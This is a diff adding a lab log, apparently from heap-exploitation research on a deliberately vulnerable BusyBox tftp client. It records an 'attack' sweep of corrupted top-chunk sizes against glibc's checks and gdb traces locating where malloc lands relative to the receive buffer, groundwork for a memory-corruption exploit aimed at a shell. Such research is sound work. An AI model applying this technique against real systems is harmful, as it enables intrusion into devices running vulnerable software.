@@ -1,0 +1,49 @@
+=== CLOCK Tue Nov 24 01:57:02 AM UTC 2026
+=== PINS
+183410e8b1bbf9e07397d6ccf9eb20fa13c2644b8fffb4a40b94855f1d3b7044  vuln-tftp.c
+015669f9c8924fd006b02abcc2cb6665d9ec5cd7f749d8ca8b16859c996c888f  fixed-tftp.c
+0013e9354961693f136572ec6e37dceb883b6951edcf01f423b276ed2aa765f5  busybox.config
+4ec897f312dd74a98cd1c127b662a88d13f5aec92e62e78a11193ac0ac996763  busybox-plain
+406e9c7522f3f5bea8f3a0e71753d7791f4a6b6c22c90dd9992f18532b118191  heap_probe.py
+6cd1c976184cc5a915c56b89dd03dec2db007aab9371c415ba84c9e6a29ff201  malloc_probe.py
+52563430c76811d595e733e9cb23fcf30fe56c1ad796cba7f48cbc1ffd7aeb49  run-malloc.sh
+=== 1 GUARD SWEEP (RC -6 = glibc abort; values above 0x21000 abort)
+TOP_SIZE=0x4141414141414141 MODE attack TOP_SIZE 0x4141414141414141 RC -6 malloc(): corrupted top size 
+TOP_SIZE=0xffffffffffffffff MODE attack TOP_SIZE 0xffffffffffffffff RC -6 malloc(): corrupted top size 
+TOP_SIZE=0x22000 MODE attack TOP_SIZE 0x22000 RC -6 malloc(): corrupted top size 
+TOP_SIZE=0x21008 MODE attack TOP_SIZE 0x21008 RC -6 malloc(): corrupted top size 
+TOP_SIZE=0x21007 MODE attack TOP_SIZE 0x21007 RC 1 
+TOP_SIZE=0x21000 MODE attack TOP_SIZE 0x21000 RC 1 
+TOP_SIZE=0x20000 MODE attack TOP_SIZE 0x20000 RC 1 
+TOP_SIZE=0x10000 MODE attack TOP_SIZE 0x10000 RC 1 
+TOP_SIZE=0x21 MODE attack TOP_SIZE 0x21 RC -6 Fatal glibc error: malloc.c:2599 (sysmalloc): assertion failed: (old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0) 
+TOP_SIZE=0x20cb1 MODE attack TOP_SIZE 0x20cb1 RC 1 
+=== 2 MALLOC LANDING under gdb (DELTA is bytes from rbuf)
+TOP_SIZE 0x20000 RC 0
+GDB FIRST RBUF=0x61d3a3b4a310 XBUF=0x61d3a3b4a2c0 NEXT=0x20cb1
+GDB SECOND IO_BUFSIZE=516 LEN=516 NEXT=0x20000
+GDB MALLOC_CALLED size=0x57
+GDB MALLOC_RET=0x61d3a3b4a360 RBUF=0x61d3a3b4a310 DELTA=80
+GDB #0  __vasprintf_internal (result_ptr=0x7ffcf1499b48, format=<optimized out>, args=<optimized out>, mode_flags=<optimized out>) at ./libio/vasprintf.c:117
+GDB #1  0x000061d38d0c38bf in bb_verror_msg (s=0x61d38d0c8203 "server error: (%u) %s", p=0x7ffcf1499bf0, strerr=0x0) at libbb/verror_msg.c:50
+GDB #2  0x000061d38d0c3c71 in bb_error_msg (s=0x61d38d0c8203 "server error: (%u) %s") at libbb/verror_msg.c:174
+GDB #3  0x000061d38d0aee2a in tftp_protocol (our_lsa=0xffffffffffffffff, peer_lsa=0x61d3a3b4a2a0, local_file=0x7ffcf149a64f "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/malloc-probe-out.bin", remote_file=0x7ffcf149a6a7 "MISHE", want_transfer_size=1, blksize=512) at networking/tftp.c:
+TOP_SIZE 0x10000 RC 0
+GDB FIRST RBUF=0x5f3d46fc9310 XBUF=0x5f3d46fc92c0 NEXT=0x20cb1
+GDB SECOND IO_BUFSIZE=516 LEN=516 NEXT=0x10000
+GDB MALLOC_CALLED size=0x57
+GDB MALLOC_RET=0x5f3d46fc9360 RBUF=0x5f3d46fc9310 DELTA=80
+GDB #0  __vasprintf_internal (result_ptr=0x7fffa633aec8, format=<optimized out>, args=<optimized out>, mode_flags=<optimized out>) at ./libio/vasprintf.c:117
+GDB #1  0x00005f3d26a4b8bf in bb_verror_msg (s=0x5f3d26a50203 "server error: (%u) %s", p=0x7fffa633af70, strerr=0x0) at libbb/verror_msg.c:50
+GDB #2  0x00005f3d26a4bc71 in bb_error_msg (s=0x5f3d26a50203 "server error: (%u) %s") at libbb/verror_msg.c:174
+GDB #3  0x00005f3d26a36e2a in tftp_protocol (our_lsa=0xffffffffffffffff, peer_lsa=0x5f3d46fc92a0, local_file=0x7fffa633c64f "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/malloc-probe-out.bin", remote_file=0x7fffa633c6a7 "MISHE", want_transfer_size=1, blksize=512) at networking/tftp.c:
+TOP_SIZE 0x20cb1 RC 0
+GDB FIRST RBUF=0x64000d041310 XBUF=0x64000d0412c0 NEXT=0x20cb1
+GDB SECOND IO_BUFSIZE=516 LEN=516 NEXT=0x20cb1
+GDB MALLOC_CALLED size=0x5a
+GDB MALLOC_RET=0x64000d041360 RBUF=0x64000d041310 DELTA=80
+GDB #0  __vasprintf_internal (result_ptr=0x7ffe9b686e58, format=<optimized out>, args=<optimized out>, mode_flags=<optimized out>) at ./libio/vasprintf.c:117
+GDB #1  0x000063fffc8ea8bf in bb_verror_msg (s=0x63fffc8ef203 "server error: (%u) %s", p=0x7ffe9b686f00, strerr=0x0) at libbb/verror_msg.c:50
+GDB #2  0x000063fffc8eac71 in bb_error_msg (s=0x63fffc8ef203 "server error: (%u) %s") at libbb/verror_msg.c:174
+GDB #3  0x000063fffc8d5e2a in tftp_protocol (our_lsa=0xffffffffffffffff, peer_lsa=0x64000d0412a0, local_file=0x7ffe9b68864f "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/malloc-probe-out.bin", remote_file=0x7ffe9b6886a7 "MISHE", want_transfer_size=1, blksize=512) at networking/tftp.c:
+=== DONE Tue Nov 24 01:57:44 AM UTC 2026
